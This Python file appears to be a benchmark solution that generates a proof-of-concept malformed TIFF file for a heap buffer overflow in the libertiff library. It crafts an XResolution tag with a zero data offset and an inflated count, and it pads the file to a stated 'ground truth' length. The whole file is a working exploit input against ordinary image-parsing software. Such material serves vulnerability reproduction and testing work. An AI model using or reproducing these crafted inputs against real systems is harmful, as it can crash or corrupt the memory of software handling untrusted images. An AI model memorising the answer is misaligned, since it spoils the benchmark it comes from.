import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Buffer Overflow in libertiff caused by invalid offline tags 
        # with a value offset of zero.
        # We construct a valid TIFF structure but include a tag (XResolution) that is "offline" 
        # (data size > 4 bytes) and set its offset to 0. We also give it a large count to 
        # ensure a heap buffer over-read/overflow when the parser attempts to read the data.

        # 1. TIFF Header
        # Byte Order: Little Endian ('II')
        # Version: 42
        # Offset to first IFD: 8
        header = struct.pack('<2sH I', b'II', 42, 8)

        # 2. Directory Entries
        # We create 11 entries.
        # Entry format: Tag (2), Type (2), Count (4), Value/Offset (4) -> 12 bytes
        # Types: 3=SHORT, 4=LONG, 5=RATIONAL
        
        def make_entry(tag, type_, count, val):
            return struct.pack('<HHII', tag, type_, count, val)

        entries = [
            make_entry(0x0100, 3, 1, 256),   # ImageWidth
            make_entry(0x0101, 3, 1, 256),   # ImageLength
            make_entry(0x0102, 3, 1, 8),     # BitsPerSample
            make_entry(0x0103, 3, 1, 1),     # Compression
            make_entry(0x0106, 3, 1, 1),     # PhotometricInterpretation
            make_entry(0x0111, 4, 1, 162),   # StripOffsets (Points to EOF)
            make_entry(0x0116, 3, 1, 256),   # RowsPerStrip
            make_entry(0x0117, 4, 1, 10),    # StripByteCounts
            
            # Vulnerable Tag: XResolution (0x11A)
            # Type 5 (RATIONAL) is 8 bytes, so it is an offline tag.
            # We set Offset to 0 (Trigger condition).
            # We set Count to 200 (Large enough to cause overflow reading from offset 0).
            make_entry(0x011A, 5, 200, 0),
            
            # YResolution (0x11B) - Valid offline tag
            # Offset 154 points to the data at the end of the file.
            make_entry(0x011B, 5, 1, 154),
            
            # ResolutionUnit (0x128)
            make_entry(0x0128, 3, 1, 2),
        ]

        # 3. Assemble IFD
        num_entries = struct.pack('<H', len(entries))
        entries_data = b''.join(entries)
        next_ifd = struct.pack('<I', 0)

        # 4. Data Padding
        # Current size: 8 (Header) + 2 (Num) + 132 (Entries) + 4 (Next) = 146 bytes.
        # We pad 16 bytes to reach the ground truth length of 162 bytes.
        # This padding also serves as valid data for YResolution (and nominally XResolution).
        padding = b'\x00' * 16

        return header + num_entries + entries_data + next_ifd + padding